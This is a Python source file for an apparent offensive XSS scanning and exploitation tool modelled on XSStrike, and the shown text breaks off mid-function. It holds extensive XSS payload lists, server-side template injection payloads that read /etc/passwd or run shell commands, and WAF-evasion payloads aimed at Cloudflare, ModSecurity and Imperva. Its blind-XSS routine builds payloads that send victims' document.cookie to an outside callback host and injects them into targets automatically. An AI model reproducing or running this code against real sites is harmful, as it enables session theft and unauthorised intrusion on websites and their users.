#!/usr/bin/env python3
"""
ZYLON FUSION - XSStrike Enhancement Engine
Fused from: s0md3v/XSStrike + Custom Zylon Techniques
Capabilities:
  - Context-aware XSS payload generation (HTML, JS, attribute, URL contexts)
  - 4 parsers: HTML, JS, DOM, response analyzer
  - Intelligent payload generation (not blind spray)
  - DOM XSS detection via source/sink analysis
  - Crawler + fuzzer combined
  - Blind XSS callback testing
  - WAF detection and evasion
  - Parameter mining
  - Filter bypass techniques (encoding, case manipulation, tag alternatives)
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import time
import random
import string
import urllib.parse
import hashlib
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from html.parser import HTMLParser

# ============================================================================
# ANSI COLOR CODES
# ============================================================================

R = '\033[91m'    # Red
G = '\033[92m'    # Green
Y = '\033[93m'    # Yellow
C = '\033[96m'    # Cyan
W = '\033[97m'    # White
B = '\033[94m'    # Blue
M = '\033[95m'    # Magenta
BD = '\033[1m'    # Bold
RS = '\033[0m'    # Reset

# ============================================================================
# INJECTION CONTEXT TYPES
# ============================================================================

CONTEXT_HTML_BODY = "html_body"
CONTEXT_HTML_ATTRIBUTE = "html_attribute"
CONTEXT_JAVASCRIPT = "javascript"
CONTEXT_URL = "url"
CONTEXT_CSS = "css"
CONTEXT_TEMPLATE = "template_literal"
CONTEXT_UNKNOWN = "unknown"

# ============================================================================
# DOM XSS SOURCES & SINKS (Extended from XSStrike)
# ============================================================================

DOM_SOURCES = [
    "location", "location.href", "location.hash", "location.search",
    "location.pathname", "location.port", "location.protocol",
    "document.URL", "document.documentURI", "document.baseURI",
    "document.referrer", "document.location",
    "window.name", "window.location",
    "document.cookie", "document.domain",
    "history.pushState", "history.replaceState",
    "window.postMessage",
    "localStorage", "sessionStorage",
    "angular.element", "jQuery.attr",
]

DOM_SINKS = [
    "eval", "setTimeout", "setInterval", "Function",
    "document.write", "document.writeln", "document.execCommand",
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "srcdoc", "textContent",
    "jQuery.html", "jQuery.append", "jQuery.prepend",
    "jQuery.after", "jQuery.before", "jQuery.wrap",
    "jQuery.replaceWith", "jQuery.insertAfter",
    "angular.element.html",
    "React.createElement",
    "document.implementation.createHTMLDocument",
    "DOMParser.parseFromString",
    "createContextualFragment",
    "script.src", "iframe.src", "embed.src", "object.data",
    "location.assign", "location.replace",
    "window.open",
]

# ============================================================================
# CONTEXT-AWARE PAYLOAD DATABASE
# ============================================================================

# HTML Body Context Payloads
PAYLOADS_HTML_BODY = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<form><button formaction="javascript:alert(1)">click',
    '<a href="javascript:alert(1)">click</a>',
    '<div onmouseover=alert(1)>hover</div>',
    '<math><mtext><table><mglyph><style><!--</style>',
    '<isindex action="javascript:alert(1)" type=submit>',
    '<xmp><p title="</xmp><img src=x onerror=alert(1)>">',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<math><mi//xlink:href="javascript:alert(1)">click',
    '<data value="javascript:alert(1)">test</data>',
]

# HTML Attribute Context Payloads
PAYLOADS_HTML_ATTR = [
    '" onmouseover=alert(1) "',
    "' onmouseover=alert(1) '",
    '" onfocus=alert(1) autofocus="',
    "' onfocus=alert(1) autofocus='",
    '" onerror=alert(1) ',
    "' onerror=alert(1) ",
    '" onclick=alert(1) "',
    "' onclick=alert(1) '",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '" autofocus onfocus=alert(1) "',
    "' autofocus onfocus=alert(1) '",
    '" oninput=alert(1) autofocus "',
    '" onchange=alert(1) "',
    '" onblur=alert(1) "',
    'javascript:alert(1)',
    '" style="animation-name:xss" onanimationstart="alert(1)" "',
]

# JavaScript Context Payloads
PAYLOADS_JAVASCRIPT = [
    "';alert(1);//",
    "';alert(1)//",
    "\\';alert(1);//",
    "'';!--\"<XSS>=&{()}",
    "';document.location='javascript:alert(1)//",
    "x';alert(1);//",
    "';alert(String.fromCharCode(88,83,83))//",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "alert(1)//",
    "-alert(1)-",
    "1;alert(1)",
    "';return false;}alert(1);//",
    "x=x;alert(1);y=x",
    "\";alert(1)//",
    "'-alert(1)-'",
    "</script><script>alert(1)</script>",
    "\\x3c/script\\x3e\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "${alert(1)}",
    "{{constructor.constructor(\"alert(1)\")()}}",
    "1];alert(1);//",
    "'];alert(1);//",
    "1);alert(1);//",
    "' + alert(1) + '",
    "\" + alert(1) + \"",
    "`${alert(1)}`",
]

# URL Context Payloads
PAYLOADS_URL = [
    'javascript:alert(1)',
    'javascript:void(alert(1))',
    'javascript:alert(document.cookie)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:alert(1)',
    'javascript:alert(1)//',
    'javascript:%61lert(1)',
    'javascript:al\x65rt(1)',
    'jav\nascript:alert(1)',
    'jav\tascript:alert(1)',
]

# Template Literal Payloads
PAYLOADS_TEMPLATE = [
    '${alert(1)}',
    '{{7*7}}',
    '${7*7}',
    '<%=alert(1)%>',
    '#{alert(1)}',
    '{{constructor.constructor("alert(1)")()}}',
    '${__import__("os").popen("id").read()}',
    '<%= `alert(1)` %>',
    '{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}',
]

# WAF Evasion Payloads (Context-Specific)
PAYLOADS_WAF_EVASION = {
    "Cloudflare": [
        '<script/xss>alert(1)</script>',
        '<img/src=x/onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<ScRiPt>alert(1)</sCrIpT>',
        '<script>al\\x65rt(1)</script>',
        '<script>al\\u0065rt(1)</script>',
        '<script>al&#101;rt(1)</script>',
        '<script>al&#x65;rt(1)</script>',
        '<img src=x onerror="al&#x65;rt(1)">',
        '<input/onfocus=alert(1) autofocus>',
        '<details/open/ontoggle=alert(1)>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src=x onerror=alert`1`>',
        '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
        '<script>%61lert(1)</script>',
    ],
    "ModSecurity": [
        '<script>alert(1)</script>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<script>prompt(1)</script>',
        '<svg/onload=alert(1)>',
        '<img src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
    ],
    "Imperva": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src=x onerror=alert`1`>',
        '<svg/onload=alert(1)//',
    ],
    "Generic": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<ScRiPt>alert(1)</sCrIpT>',
        '<script>al\\x65rt(1)</script>',
        '<script>al&#101;rt(1)</script>',
        '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
        '<img/src=x/onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<input/onfocus=alert(1) autofocus>',
        '<details/open/ontoggle=alert(1)>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src=x onerror=alert`1`>',
        '<script>%61lert(1)</script>',
        '<body/onload=alert(1)>',
    ],
}

# Filter Bypass Encoding Techniques
ENCODING_BYPASSES = {
    "html_entity_decimal": lambda p: ''.join(f'&#{ord(c)};' if c in '<>"\'()' else c for c in p),
    "html_entity_hex": lambda p: ''.join(f'&#x{ord(c):02x};' if c in '<>"\'()' else c for c in p),
    "unicode_escape": lambda p: ''.join(f'\\u{ord(c):04x}' if c in '<>"\'()' else c for c in p),
    "url_encoding": lambda p: urllib.parse.quote(p, safe=''),
    "double_url_encoding": lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
    "base64_data_uri": lambda p: f'data:text/html;base64,{__import__("base64").b64encode(p.encode()).decode()}',
    "case_alternation": lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
    "null_byte_insert": lambda p: p.replace('<', '<\x00').replace('>', '>\x00'),
    "tab_newline_insert": lambda p: p.replace(' ', '\t').replace('<', '<\n'),
    "comment_break": lambda p: re.sub(r'(script|img|svg|body)', lambda m: m.group(0)[0]+'<!---->'+m.group(0)[1:], p, flags=re.IGNORECASE),
}

# Common parameters to mine
COMMON_PARAMETERS = [
    "q", "query", "search", "keyword", "term", "input", "name", "value",
    "id", "page", "sort", "order", "dir", "file", "lang", "category",
    "user", "username", "email", "password", "pass", "token", "key",
    "url", "ref", "redirect", "return", "next", "callback", "format",
    "type", "action", "mode", "step", "state", "code", "request_id",
    "item", "product", "cart", "order_id", "invoice", "payment",
    "date", "from", "to", "start", "end", "limit", "offset",
    "debug", "test", "admin", "config", "settings", "profile",
    "msg", "message", "comment", "post", "content", "body", "text",
    "title", "description", "tag", "label", "group", "role",
]


# ============================================================================
# HTML PARSER FOR FORM/INPUT EXTRACTION
# ============================================================================

class ZylonHTMLParser(HTMLParser):
    """Custom HTML parser for extracting forms, inputs, and links"""

    def __init__(self):
        super().__init__()
        self.forms = []
        self.inputs = []
        self.links = []
        self.scripts = []
        self.current_form = None
        self.meta_tags = []
        self.comments = []

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)

        if tag == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'GET').upper(),
                'inputs': [],
            }
        elif tag == 'input' and self.current_form is not None:
            self.current_form['inputs'].append(attrs_dict)
        elif tag == 'input':
            self.inputs.append(attrs_dict)
        elif tag == 'a':
            self.links.append(attrs_dict.get('href', ''))
        elif tag == 'script':
            self.scripts.append(attrs_dict.get('src', ''))
        elif tag == 'meta':
            self.meta_tags.append(attrs_dict)

    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None

    def handle_comment(self, data):
        self.comments.append(data)


class XSStrikeEngine:
    """
    XSStrike Enhancement Engine - Intelligent XSS Detection & Exploitation
    Implements XSStrike-style context-aware scanning without external dependency.
    """

    def __init__(self, session=None, timeout=10, retries=3, threads=5,
                 delay=0, verbose=True, proxy=None, callback_url=None):
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.timeout = timeout
        self.retries = retries
        self.threads = threads
        self.delay = delay
        self.verbose = verbose
        self.callback_url = callback_url
        self.findings = []
        self.waf_type = None
        self.crawled_urls = set()
        self.crawled_forms = []
        self._original_response = None
        self._original_length = 0
        self._marker = None
        self._generate_marker()

    def _generate_marker(self):
        """Generate unique marker for reflection detection"""
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self._marker = f"zylonxss{rand}"
        self._marker_regex = re.compile(re.escape(self._marker), re.IGNORECASE)

    def _log(self, msg, level="info"):
        """Print colored log message"""
        colors = {
            "info": C, "success": G, "warning": Y,
            "error": R, "critical": R, "payload": M
        }
        color = colors.get(level, W)
        prefix = {
            "info": "*", "success": "+", "warning": "!",
            "error": "-", "critical": "!!!", "payload": ">"
        }.get(level, "*")
        if self.verbose:
            print(f"  {color}[{prefix}]{RS} {msg}")

    def _send_request(self, url, method='GET', data=None, headers=None,
                      cookies=None, allow_redirects=True):
        """Send HTTP request with error handling and retries"""
        for attempt in range(self.retries):
            try:
                if method.upper() == 'POST':
                    resp = self.session.post(url, data=data, headers=headers,
                                            cookies=cookies, timeout=self.timeout,
                                            allow_redirects=allow_redirects)
                else:
                    resp = self.session.get(url, params=data, headers=headers,
                                           cookies=cookies, timeout=self.timeout,
                                           allow_redirects=allow_redirects)
                if self.delay > 0:
                    time.sleep(self.delay)
                return resp
            except requests.exceptions.Timeout:
                self._log(f"Timeout (attempt {attempt+1}/{self.retries})", "warning")
            except requests.exceptions.ConnectionError:
                self._log(f"Connection error (attempt {attempt+1}/{self.retries})", "warning")
                time.sleep(1)
            except Exception as e:
                self._log(f"Request error: {str(e)[:60]}", "error")
        return None

    def _inject_and_check(self, url, param, payload, method='GET', data=None):
        """Inject payload and check for reflection"""
        try:
            encoded_payload = urllib.parse.quote(payload, safe='')
            if method.upper() == 'POST':
                req_data = data.copy() if data else {}
                req_data[param] = payload
                resp = self._send_request(url, method='POST', data=req_data)
            else:
                sep = "&" if "?" in url else "?"
                inject_url = f"{url}{sep}{param}={encoded_payload}"
                resp = self._send_request(inject_url, method='GET')

            if not resp:
                return None, False, "no_response"

            # Check reflection
            if payload in resp.text:
                return resp, True, "exact"
            # URL-decoded check
            decoded_payload = urllib.parse.unquote(payload)
            if decoded_payload in resp.text:
                return resp, True, "decoded"
            # Partial check (some chars filtered)
            payload_stripped = re.sub(r'[<>"\']', '', payload)
            if payload_stripped and len(payload_stripped) > 3 and payload_stripped in resp.text:
                return resp, True, "partial"
            # Marker check
            if self._marker in resp.text:
                return resp, True, "marker"

            return resp, False, "none"
        except Exception as e:
            return None, False, f"error:{str(e)[:40]}"

    # ========================================================================
    # METHOD: crawl
    # ========================================================================

    def crawl(self, target):
        """
        Crawl target for forms and URLs.
        Returns dict with discovered forms, links, and scripts.
        """
        url = target if target.startswith('http') else f"https://{target}"
        self._log(f"Crawling {url}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'urls_found': [],
                'forms_found': [],
                'scripts_found': [],
                'params_found': [],
                'comments_found': [],
            },
            'scan_type': 'crawl',
        }

        resp = self._send_request(url)
        if not resp:
            self._log("Could not fetch target page", "error")
            return results

        self._original_response = resp.text
        self._original_length = len(resp.text)

        # Parse HTML
        parser = ZylonHTMLParser()
        try:
            parser.feed(resp.text)
        except Exception as e:
            self._log(f"HTML parse error: {str(e)[:50]}", "warning")

        # Process links
        from urllib.parse import urljoin
        for link in parser.links:
            if link:
                full_url = urljoin(url, link)
                if full_url not in self.crawled_urls:
                    self.crawled_urls.add(full_url)
                    results['details']['urls_found'].append(full_url)

        # Process forms
        for form in parser.forms:
            action = form.get('action', '')
            full_action = urljoin(url, action) if action else url
            form_info = {
                'action': full_action,
                'method': form.get('method', 'GET'),
                'inputs': form.get('inputs', []),
            }
            self.crawled_forms.append(form_info)
            results['details']['forms_found'].append(form_info)

            # Extract parameter names from form inputs
            for inp in form.get('inputs', []):
                name = inp.get('name', '')
                if name and name not in results['details']['params_found']:
                    results['details']['params_found'].append(name)

        # Process scripts
        results['details']['scripts_found'] = parser.scripts

        # Process comments
        results['details']['comments_found'] = parser.comments[:20]

        # Extract parameters from discovered URLs
        for found_url in results['details']['urls_found']:
            parsed = urllib.parse.urlparse(found_url)
            params = urllib.parse.parse_qs(parsed.query)
            for p in params:
                if p not in results['details']['params_found']:
                    results['details']['params_found'].append(p)

        self._log(f"Crawl complete: {len(results['details']['urls_found'])} URLs, "
                  f"{len(results['details']['forms_found'])} forms, "
                  f"{len(results['details']['params_found'])} params", "success")

        return results

    # ========================================================================
    # METHOD: mine_parameters
    # ========================================================================

    def mine_parameters(self, url):
        """
        Find hidden parameters through reflection testing.
        Returns dict with discovered parameters.
        """
        if not url.startswith('http'):
            url = f"https://{url}"
        self._log(f"Mining parameters on {url}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'reflected_params': [],
                'total_tested': 0,
            },
            'scan_type': 'parameter_mining',
        }

        tested = 0
        for param in COMMON_PARAMETERS:
            tested += 1
            marker_value = f"{self._marker}{random.randint(1000,9999)}"
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={marker_value}"
            resp = self._send_request(test_url)
            if resp and self._marker in resp.text:
                # Parameter is reflected!
                results['details']['reflected_params'].append({
                    'parameter': param,
                    'reflected_value': marker_value,
                })
                results['findings'].append({
                    'type': 'reflected_parameter',
                    'parameter': param,
                    'evidence': f"Marker '{self._marker}' found in response",
                })
                self._log(f"Reflected param found: {param}", "success")

        results['details']['total_tested'] = tested
        results['vulnerable'] = len(results['details']['reflected_params']) > 0
        self._log(f"Parameter mining complete: {len(results['details']['reflected_params'])} "
                  f"reflected out of {tested} tested", "info")
        return results

    # ========================================================================
    # METHOD: detect_context
    # ========================================================================

    def detect_context(self, response_text, injection_point):
        """
        Analyze injection context from response text.
        Returns the detected context type.
        """
        if not response_text:
            return CONTEXT_UNKNOWN

        text = response_text
        marker = injection_point or self._marker
        context = CONTEXT_UNKNOWN

        # 1. Check JavaScript context
        js_patterns = [
            rf'var\s+\w+\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
            rf'let\s+\w+\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
            rf'const\s+\w+\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
            rf'["\'][^"\']*{re.escape(marker[:12])}[^"\']*["\']\s*[;,]',
            rf'<script[^>]*>[^<]*{re.escape(marker[:12])}',
            rf'function\s*\([^)]*\)\s*\{{[^}}]*{re.escape(marker[:12])}',
            rf'=>\s*\{{[^}}]*{re.escape(marker[:12])}',
        ]
        for p in js_patterns:
            if re.search(p, text, re.IGNORECASE):
                context = CONTEXT_JAVASCRIPT
                break

        # 2. Check HTML attribute context
        if context == CONTEXT_UNKNOWN:
            attr_patterns = [
                rf'value\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
                rf'href\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
                rf'src\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
                rf'action\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
                rf'\w+\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
            ]
            for p in attr_patterns:
                if re.search(p, text, re.IGNORECASE):
                    # Determine if it's a URL attribute
                    if re.search(rf'(href|src|action)\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
                                text, re.IGNORECASE):
                        context = CONTEXT_URL
                    else:
                        context = CONTEXT_HTML_ATTRIBUTE
                    break

        # 3. Check template literal context
        if context == CONTEXT_UNKNOWN:
            template_patterns = [
                rf'\$\{{[^}}]*{re.escape(marker[:12])}',
                rf'\{{{{[^}}]*{re.escape(marker[:12])}',
                rf'<%[^%]*{re.escape(marker[:12])}',
            ]
            for p in template_patterns:
                if re.search(p, text, re.IGNORECASE):
                    context = CONTEXT_TEMPLATE
                    break

        # 4. Check CSS context
        if context == CONTEXT_UNKNOWN:
            css_patterns = [
                rf'style\s*=\s*["\'][^"\']*{re.escape(marker[:12])}',
                rf'<style[^>]*>[^<]*{re.escape(marker[:12])}',
            ]
            for p in css_patterns:
                if re.search(p, text, re.IGNORECASE):
                    context = CONTEXT_CSS
                    break

        # 5. Default to HTML body
        if context == CONTEXT_UNKNOWN:
            if marker[:12] in text:
                context = CONTEXT_HTML_BODY

        self._log(f"Detected injection context: {context}", "info")
        return context

    # ========================================================================
    # METHOD: generate_payloads
    # ========================================================================

    def generate_payloads(self, context, waf_type=None):
        """
        Generate context-aware XSS payloads.
        Returns list of payloads tailored to the injection context.
        """
        # Select base payloads by context
        context_payload_map = {
            CONTEXT_HTML_BODY: PAYLOADS_HTML_BODY,
            CONTEXT_HTML_ATTRIBUTE: PAYLOADS_HTML_ATTR,
            CONTEXT_JAVASCRIPT: PAYLOADS_JAVASCRIPT,
            CONTEXT_URL: PAYLOADS_URL,
            CONTEXT_CSS: [
                'expression(alert(1))',
                'url("javascript:alert(1)")',
                '-moz-binding:url("data:text/xml,xss")',
                'behavior:url("xss.htc")',
            ],
            CONTEXT_TEMPLATE: PAYLOADS_TEMPLATE,
            CONTEXT_UNKNOWN: PAYLOADS_HTML_BODY + PAYLOADS_JAVASCRIPT + PAYLOADS_HTML_ATTR,
        }

        payloads = list(context_payload_map.get(context, PAYLOADS_HTML_BODY))

        # Add WAF evasion payloads if WAF detected
        if waf_type and waf_type in PAYLOADS_WAF_EVASION:
            payloads.extend(PAYLOADS_WAF_EVASION[waf_type])
        elif waf_type:
            payloads.extend(PAYLOADS_WAF_EVASION["Generic"])

        # Add encoding bypass variants for top payloads
        if context in [CONTEXT_HTML_BODY, CONTEXT_HTML_ATTRIBUTE]:
            top_payloads = payloads[:3]
            for payload in top_payloads:
                for enc_name, enc_func in list(ENCODING_BYPASSES.items())[:4]:
                    try:
                        encoded = enc_func(payload)
                        if encoded != payload:
                            payloads.append(encoded)
                    except Exception:
                        pass

        self._log(f"Generated {len(payloads)} payloads for context: {context}", "info")
        return payloads

    # ========================================================================
    # METHOD: test_reflected
    # ========================================================================

    def test_reflected(self, url, param):
        """
        Test for reflected XSS with context-aware payloads.
        Returns dict with reflected XSS results.
        """
        if not url.startswith('http'):
            url = f"https://{url}"
        self._log(f"Testing reflected XSS on {url} param={param}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'injection_context': CONTEXT_UNKNOWN,
                'successful_payloads': [],
                'partial_reflections': [],
                'waf_detected': False,
                'waf_type': None,
                'total_tested': 0,
            },
            'scan_type': 'reflected_xss',
        }

        # Step 1: Test reflection with marker
        marker_payload = f"{self._marker}zylon{random.randint(1000,9999)}"
        resp, reflected, ref_type = self._inject_and_check(url, param, marker_payload)

        if not reflected or ref_type == "none":
            # Try without URL encoding
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={marker_payload}"
            resp = self._send_request(test_url)
            if resp and self._marker in resp.text:
                reflected = True
                ref_type = "unencoded"

        if not reflected:
            self._log("Parameter not reflected - trying POST", "info")
            resp = self._send_request(url, method='POST', data={param: marker_payload})
            if resp and self._marker in resp.text:
                reflected = True
                ref_type = "post_reflected"

        if not reflected:
            self._log("Parameter not reflected in response", "warning")
            return results

        # Step 2: Detect injection context
        if resp:
            context = self.detect_context(resp.text, self._marker)
            results['details']['injection_context'] = context

        # Step 3: Generate context-aware payloads
        payloads = self.generate_payloads(context, self.waf_type)
        self._log(f"Testing {len(payloads)} context-aware payloads", "info")

        # Step 4: Test each payload
        tested = 0
        for payload in payloads:
            tested += 1
            resp, reflected, ref_type = self._inject_and_check(url, param, payload)

            if reflected:
                is_executable = self._is_executable(payload, resp.text if resp else "")
                finding = {
                    'type': 'reflected_xss',
                    'payload': payload[:100],
                    'param': param,
                    'reflection_type': ref_type,
                    'executable': is_executable,
                    'context': context,
                }
                results['details']['successful_payloads'].append(finding)
                results['findings'].append(finding)

                if is_executable:
                    results['vulnerable'] = True
                    self._log(f"{G}CONFIRMED XSS: {payload[:60]}{RS}", "success")
                else:
                    results['details']['partial_reflections'].append(finding)
                    self._log(f"Reflected (not executable): {payload[:60]}", "warning")

            # WAF detection from response
            if resp and resp.status_code in [403, 406, 429, 501]:
                results['details']['waf_detected'] = True
                if not results['details']['waf_type']:
                    waf = self._identify_waf_from_response(resp)
                    if waf:
                        results['details']['waf_type'] = waf
                        self.waf_type = waf

        results['details']['total_tested'] = tested

        # Step 5: If not vulnerable but WAF detected, try evasion payloads
        if not results['vulnerable'] and results['details']['waf_detected']:
            self._log("Trying WAF evasion payloads...", "info")
            waf_payloads = PAYLOADS_WAF_EVASION.get(
                results['details']['waf_type'], PAYLOADS_WAF_EVASION["Generic"]
            )
            for payload in waf_payloads:
                resp, reflected, ref_type = self._inject_and_check(url, param, payload)
                if reflected:
                    is_executable = self._is_executable(payload, resp.text if resp else "")
                    if is_executable:
                        results['vulnerable'] = True
                        results['findings'].append({
                            'type': 'waf_bypass_xss',
                            'payload': payload[:100],
                            'param': param,
                            'waf': results['details']['waf_type'],
                            'executable': True,
                        })
                        self._log(f"WAF bypass XSS: {payload[:60]}", "success")
                        break

        return results

    def _is_executable(self, payload, response_text):
        """Check if the payload is in an executable context in the response"""
        executable_indicators = [
            '<script', 'onerror=', 'onload=', 'onfocus=', 'ontoggle=',
            'onmouseover=', 'javascript:', 'onclick=', 'oninput=',
            'onanimationstart=', 'onbegin=', 'alert(', 'prompt(',
        ]
        for indicator in executable_indicators:
            if indicator in payload and indicator in response_text:
                # Verify the payload context is actually in an executable position
                idx = response_text.find(indicator)
                if idx > 0:
                    # Check if it's inside HTML comment (not executable)
                    before = response_text[max(0, idx-20):idx]
                    if '<!--' not in before:
                        return True
        return False

    # ========================================================================
    # METHOD: test_dom
    # ========================================================================

    def test_dom(self, url):
        """
        Test for DOM XSS via source/sink analysis.
        Returns dict with DOM XSS results.
        """
        if not url.startswith('http'):
            url = f"https://{url}"
        self._log(f"Testing DOM XSS on {url}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'sources_found': [],
                'sinks_found': [],
                'potential_flows': [],
                'inline_scripts_analyzed': 0,
            },
            'scan_type': 'dom_xss',
        }

        resp = self._send_request(url)
        if not resp:
            self._log("Could not fetch target page", "error")
            return results

        text = resp.text

        # Extract inline script blocks
        script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', text,
                                  re.IGNORECASE | re.DOTALL)
        results['details']['inline_scripts_analyzed'] = len(script_blocks)

        # Find DOM sources
        for source in DOM_SOURCES:
            source_short = source.split('.')[-1] if '.' in source else source
            for block in script_blocks:
                # Check for source usage
                patterns = [
                    rf'\b{re.escape(source)}\b',
                    rf'\b{re.escape(source_short)}\b',
                ]
                for p in patterns:
                    if re.search(p, block):
                        if source not in results['details']['sources_found']:
                            results['details']['sources_found'].append(source)
                        break

        # Find DOM sinks
        for sink in DOM_SINKS:
            sink_short = sink.split('.')[-1] if '.' in sink else sink
            for block in script_blocks:
                if sink_short in block or sink in block:
                    if sink not in results['details']['sinks_found']:
                        results['details']['sinks_found'].append(sink)

        # Also check for sources/sinks in event handlers within HTML attributes
        event_handlers = re.findall(r'on\w+\s*=\s*["\']([^"\']+)["\']', text, re.IGNORECASE)
        for handler in event_handlers:
            for source in DOM_SOURCES:
                src_short = source.split('.')[-1] if '.' in source else source
                if src_short in handler and source not in results['details']['sources_found']:
                    results['details']['sources_found'].append(source)
            for sink in DOM_SINKS:
                snk_short = sink.split('.')[-1] if '.' in sink else sink
                if snk_short in handler and sink not in results['details']['sinks_found']:
                    results['details']['sinks_found'].append(sink)

        # Analyze source->sink flows
        for source in results['details']['sources_found']:
            src_short = source.split('.')[-1] if '.' in source else source
            for sink in results['details']['sinks_found']:
                snk_short = sink.split('.')[-1] if '.' in sink else sink
                # Check if both appear in same script block
                for block in script_blocks:
                    if src_short in block and snk_short in block:
                        # Extract relevant code snippet
                        snippet = block.strip()[:300]
                        flow = {
                            'source': source,
                            'sink': sink,
                            'snippet': snippet,
                        }
                        # Deduplicate
                        if flow not in results['details']['potential_flows']:
                            results['details']['potential_flows'].append(flow)
                            results['vulnerable'] = True
                            results['findings'].append({
                                'type': 'dom_xss_flow',
                                'source': source,
                                'sink': sink,
                                'evidence': snippet[:200],
                            })
                            self._log(f"DOM XSS flow: {source} -> {sink}", "success")

        # Also check for direct document.write with location
        doc_write_patterns = [
            r'document\.write\s*\([^)]*(?:location|URL|href|search|hash|referrer)[^)]*\)',
            r'\.innerHTML\s*=\s*[^;]*(?:location|URL|href|search|hash|referrer)',
            r'\.outerHTML\s*=\s*[^;]*(?:location|URL|href|search|hash|referrer)',
            r'eval\s*\([^)]*(?:location|URL|href|search|hash)[^)]*\)',
        ]
        for pattern in doc_write_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                results['vulnerable'] = True
                results['findings'].append({
                    'type': 'dom_xss_direct',
                    'pattern': pattern,
                    'evidence': match[:200],
                })
                self._log(f"Direct DOM XSS: {match[:80]}", "success")

        self._log(f"DOM analysis: {len(results['details']['sources_found'])} sources, "
                  f"{len(results['details']['sinks_found'])} sinks, "
                  f"{len(results['details']['potential_flows'])} flows", "info")
        return results

    # ========================================================================
    # METHOD: test_blind
    # ========================================================================

    def test_blind(self, url, callback_url=None):
        """
        Test for blind XSS via callback URL.
        Returns dict with blind XSS results.
        """
        if not url.startswith('http'):
            url = f"https://{url}"
        cb = callback_url or self.callback_url
        self._log(f"Testing blind XSS on {url} (callback: {cb or 'none'})", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'payloads_injected': [],
                'callback_url': cb,
                'injection_points': [],
            },
            'scan_type': 'blind_xss',
        }

        if not cb:
            results['details']['note'] = "No callback URL provided. Use callback_url parameter."
            self._log("No callback URL - blind XSS cannot be confirmed", "warning")
            # Still inject payloads that might trigger later
            cb = "https://callback.zylon.test/xss"

        # Generate blind XSS payloads
        blind_payloads = [
            f'<script src="{cb}"></script>',
            f'<img src=x onerror="fetch(\'{cb}?c=\'+document.cookie)">',
            f"'><script>new Image().src='{cb}?c='+document.cookie</script>",
            f'"><script>fetch("{cb}?c="+document.cookie)</script>',
            f"<script>new Image().src='{cb}?cookie='+document.cookie</script>",
            f"<script>fetch('{cb}',{{method:'POST',body:document.cookie}})</script>",
            f'<svg onload="fetch(\'{cb}?d=\'+document.domain)">',
            f"'||'<script src=\"{cb}\"></script>",
            f'\"><img src=x onerror=\"new Image().src=\\\'{cb}?c=\\\'+document.cookie\">',
        ]

        # Extract parameters from URL
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
